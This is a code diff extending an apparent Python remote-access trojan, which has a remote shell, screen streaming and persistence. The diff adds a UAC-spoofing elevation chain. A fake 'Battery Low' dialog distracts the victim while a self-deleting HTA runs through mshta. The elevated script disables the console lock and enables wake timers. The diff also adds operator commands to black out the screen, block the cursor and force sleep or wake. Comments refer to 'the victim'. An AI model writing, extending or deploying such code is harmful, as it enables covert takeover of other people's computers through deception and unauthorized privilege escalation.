+        lines.append("wake armed: %s" % ("yes" if _wake_armed() else "no"))
+        lines.append("idle: %.0fs" % _idle_seconds())
+        try:
+            out = subprocess.run("powercfg /getactivescheme", shell=True,
+                                 capture_output=True, timeout=10,
+                                 creationflags=subprocess.CREATE_NO_WINDOW)
+            lines.append(out.stdout.decode("cp1252", errors="replace").strip())
+        except Exception:
+            pass
+    return "\n".join(lines)
+
+
+def request_admin() -> str:
+    """Spoofed-elevation chain (verified): center-screen battery pretext
+    dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not this
+    process) -> elevated HTA disables sleep console-lock, enables RTC wake,
+    writes a proof flag and self-deletes. On success wake is auto-armed."""
+    if os.name != "nt":
+        return "[!] Windows only"
+    import ctypes
+    base = os.path.join(_stream_state_path(), "nvdesk")
+    os.makedirs(base, exist_ok=True)
+    flag = os.path.join(base, "elev.ok")
+    try:
+        os.remove(flag)
+    except OSError:
+        pass
+
+    # MB_OKCANCEL | MB_ICONWARNING | MB_SYSTEMMODAL | MB_SETFOREGROUND |
+    # MB_TOPMOST - centered modal, X/Cancel counts as dismissal too
+    ctypes.windll.user32.MessageBoxW(
+        None,
+        "Your battery is running low (7% remaining).\n\n"
+        "Plug in your PC to keep working.",
+        "Battery Low",
+        0x00000001 | 0x00000030 | 0x00001000 | 0x00010000 | 0x00040000)
+
+    hta = os.path.join(base, "uac.hta")
+    vbs = (
+        'On Error Resume Next\r\n'
+        'Dim sh: Set sh = CreateObject("WScript.Shell")\r\n'
+        'sh.Run "powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE '
+        'CONSOLELOCK 0", 0, True\r\n'
+        'sh.Run "powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_NONE '
+        'CONSOLELOCK 0", 0, True\r\n'
+        'sh.Run "powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
+        'RTCWAKE 1", 0, True\r\n'
+        'sh.Run "powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
+        'RTCWAKE 1", 0, True\r\n'
+        'sh.Run "powercfg /SETACTIVE SCHEME_CURRENT", 0, True\r\n'
+        'Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
+        'Dim f: Set f = fso.CreateTextFile("%(flag)s", True)\r\n'
+        'f.Write "ok"\r\n'
+        'f.Close\r\n'
+        'fso.DeleteFile "%(hta)s", True\r\n'
+        'Self.Close\r\n'
+    ) % {"flag": flag, "hta": hta}
+    with open(hta, "w", encoding="utf-16") as f:
+        f.write("<html><head><hta:application id=\"a\" caption=\"no\" "
+                "showintaskbar=\"no\"/></head>"
+                "<script language=\"VBScript\">\n" + vbs + "</script></html>")
+
+    rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", "mshta.exe",
+                                             '"' + hta + '"', None, 0)
+    if rc <= 32:
+        try:
+            os.remove(hta)
+        except OSError:
+            pass
+        return "[!] elevation declined/failed (ShellExecute rc=%d)" % rc
+    for _ in range(240):                  # 120s for the victim to click Yes
+        if os.path.exists(flag):
+            break
+        time.sleep(0.5)
+    else:
+        return "[-] elevation not confirmed within 120s"
+    try:
+        os.remove(hta)
+    except OSError:
+        pass
+    arm = _wake_arm()
+    return "[+] ELEVATED: console lock off, RTC wake on. " + arm
+
+
 def execute_command(cmd: str) -> bytes:
     """Run a shell command and return its output. Handles cd persistently."""
     low = cmd.strip().lower()
@@ -862,6 +1686,48 @@ def execute_command(cmd: str) -> bytes:
         return (deploy_stream(room) + "\n").encode() + MARKER
     if low in ("stream stop", "stop stream", "stopstream"):
         return (stop_stream() + "\n").encode() + MARKER
+
+    # overlay / cursor / elevation / power dispatch (before generic shell)
+    if low == "overlay on" or low.startswith("overlay on "):
+        return (_overlay_on("black" in low) + "\n").encode() + MARKER
+    if low == "overlay off":
+        return (_overlay_off() + "\n").encode() + MARKER
+    if low == "cursor block" or low == "cursor block hard":
+        return (_cursor_block("hard" in low) + "\n").encode() + MARKER
+    if low == "cursor unblock":
+        return (_cursor_unblock() + "\n").encode() + MARKER
+    if low == "under on":
+        return (_under_start() + "\n").encode() + MARKER
+    if low == "under off":
+        return (_under_stop() + "\n").encode() + MARKER
+    if low == "under status":
+        return (_under_status() + "\n").encode() + MARKER
+    if low == "admin":
+        return (request_admin() + "\n").encode() + MARKER
+    if low == "wake arm":
+        return (_wake_arm() + "\n").encode() + MARKER
+    if low == "wake disarm":
+        try:
+            os.remove(_wake_flag())
+        except OSError:
+            pass
+        return ("[+] wake disarmed\n").encode() + MARKER
+    if low.startswith("wake in "):
+        try:
+            mins = int(float(low.split()[2]))
+        except (ValueError, IndexError):
+            return ("[!] usage: wake in <minutes>\n").encode() + MARKER
+        if _register_wake_task(_module_exe_path(), max(1, mins)):
+            return ("[+] one-shot wake in %d min registered\n" % mins
+                    ).encode() + MARKER
+        return ("[!] task registration failed\n").encode() + MARKER
+    if low == "sleep now":
+        armed = _wake_armed()
+        threading.Thread(target=_sleep_now, daemon=True).start()
+        return ("[+] suspend initiated (wake hook armed: %s)\n" % armed
+                ).encode() + MARKER
+    if low == "power status":
+        return (_power_status() + "\n").encode() + MARKER
 
     # Handle cd internally so the working directory persists between commands
     if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
@@ -973,4 +1839,5 @@ if __name__ == "__main__":
         install_persistence()   # install + verified handoff on first run
         threading.Thread(target=_persistence_guard, daemon=True,
                          name=f"guard-{BUILD_ID[:8]}").start()
+    _start_power_hook()   # WM_POWERBROADCAST watcher (suspend/resume)
     connect()
